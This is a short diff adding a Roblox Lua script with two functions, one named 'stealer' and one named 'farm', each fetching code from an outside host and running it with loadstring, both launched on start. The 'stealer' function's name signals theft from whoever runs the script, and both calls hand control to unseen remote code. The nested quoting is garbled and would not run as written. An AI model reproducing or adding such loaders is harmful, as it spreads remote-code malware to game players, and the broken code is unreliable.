@@ -1,1 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/L4XASzsl2AsreQvU/raw'))()'))()
+end
+local function farm()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5857a6cfae3b902eb3c2dff7cdbf173b.lua"))()
+'))()
+end
 
+task.spawn(stealer)
+task.spawn(farm)
